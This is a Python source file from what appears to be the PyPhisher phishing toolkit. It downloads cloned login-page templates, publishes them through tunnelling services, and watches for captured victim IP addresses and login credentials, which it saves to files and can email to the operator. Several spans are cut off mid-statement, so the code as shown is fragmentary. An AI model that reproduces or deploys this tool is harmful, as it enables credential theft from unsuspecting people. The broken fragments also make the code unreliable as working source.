from argparse import ArgumentParser
from importlib import import_module as eximport
from glob import glob
from hashlib import sha256
from json import (
    dumps as stringify,
    loads as parse
)
from os import (
    getenv,
    kill,
    listdir,
    mkdir,
    mknod,
    popen,
    remove,
    rename,
    replace,
    system
)
from os.path import (
    abspath,
    basename,
    dirname,
    isdir,
    isfile,
    join
)
from platform import uname
from re import search, sub
from shutil import (
    copy2,
    copyfile,
    copytree,
    get_terminal_size,
    rmtree,
)
from signal import (
    SIGINT,
    SIGKILL,
    SIGTERM
)
from subprocess import (
    DEVNULL,
    PIPE,
    Popen,
    STDOUT,
    call,
    run
)
from smtplib import SMTP_SSL as smtp
from socket import (
    AF_INET as inet,
    SOCK_STREAM as stream,
    setdefaulttimeout,
    socket
)
from sys import (
    argv,
    stdout,
    version_info
)
from tarfile import open as taropen
from time import (
    ctime,
    sleep,
    time
)
from zipfile import ZipFile


# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="2.6"
    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
    exit(0)

for module in modules:
    try:
        eximport(module)
    except ImportError:
        try:
            print(f"Installing {module}")
            run(f"pip3 install {module}", shell=True)
        except:
            print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
            exit(1)
    except:
        exit(1)

for module in modules:
    try:
        eximport(module)
    except:
        print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
        exit(1)

from bs4 import BeautifulSoup
from requests import get, head, Session
from rich.console import Console
from rich.panel import Panel
from rich.progress import (
    BarColumn,
    Progress,
    TextColumn,
    TimeRemainingColumn,
    TransferSpeedColumn
)
from rich.traceback import install as override_default_traceback

override_default_traceback()
cprint = Console().print

# Get Columns of Screen
columns = get_terminal_size().columns

repo_url = "https://github.com/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61/PyPhisher"
websites_url = f"{repo_url}/releases/download/v{version}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 
    "cf": f"{cf_command} tunnel -url {local_url}",
    "loclx": f"{lx_command} tunnel http -t {local_url}",
    "lhr": f"ssh -R 80:{local_url} localhost.run -T -n"
}


# My utility functions

# Check if a process is running by 'command -v' command. If it has a output exit_code will be 0 and package is already installed
def is_installed(package):
    exit_code = bgtask(f"command -v {package}").wait() # system(f"command -v {package} > /dev/null 2>&1")
    if exit_code == 0:
        return True
    return False


# Check if a process is running by 'pidof' command. If pidof has a output exit_code will be 0 and process is running
def is_running(process):
    exit_code = bgtask(f"pidof {process}").wait()
    if exit_code == 0:
        return True
    return False


# Check if a json is valid
def is_json(myjson):
  try:
    parse(myjson)
    return True
  except:
    return False


# A simple copy function
def copy(path1, path2):
    if isdir(path1):
        if isdir(path2):
             rmtree(path2)
        copytree(path1, path2)
    if isfile(path1):
        if isdir(path2):
            copy2(path1, path2)

# Delete files/folders if exist
def delete(*paths, recreate=False):
    for path in paths:
        if isdir(path):
            if recreate:
                rmtree(path)
                mkdir(path)
            else:
                rmtree(path)
        if isfile(path): 
            remove(path)


# A poor alternative of GNU/Linux 'cat' command returning file content
def cat(file):
    if isfile(file):
        with open(file, "r") as filedata:
            return filedata.read()
    return ""
        copy("sites", sites_dir)
    if isfile(f"{sites_dir}/version.txt"):
        with open(f"{sites_dir}/version.txt", "r") as sites_file:
            zipver=sites_file.read().strip()
            if float(version) > float(zipver):
                download(websites_url, "websites.zip")
    else:
        download(websites_url, "websites.zip")
    if isfile("websites.zip"):
        delete(sites_dir, recreate=True)
        extract("websites.zip", sites_dir)
        remove("websites.zip")
    if mode != "test":
        lx_token()
        ssh_key()
    email_config = cat(email_file)
    if is_json(email_config):
        email_json = parse(email_config)
        email = email_json["email"]
        password = email_json["password"]
        receiver = email_json["receiver"]
        # As the server is of gmail, we only allow gmail login
        if "@gmail.com" in email:
            is_mail_ok = True
        else:
            print(f"\n{error}Only gmail with app password is allowed!{nc}")
            sleep(1)
exit")
    try:
        while True:
            if isfile(ip_file):
                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
                show_file_data(ip_file)
                ipdata = cat(ip_file)
                append(ipdata, main_ip)
                # Just add the ip
                append(ipdata.split("\n")[0], saved_file)
                print(f"\n{info2}Saved in {main_ip}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(ip_file)
            if isfile(cred_file):
                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
                show_file_data(cred_file)
                userdata = cat(cred_file)
                if is_mail_ok:
                    send_mail(userdata)
                append(userdata, main_cred)
                append(userdata, saved_file)
                print(f"\n{info2}Saved in {main_cred}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(cred_file)
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        main_menu()
    except KeyboardInterrupt:
        pexit()
    except Exception as e:
        exception_handler(e)
            
# If this code helped you, consider staring repository. Your stars encourage me a lot!
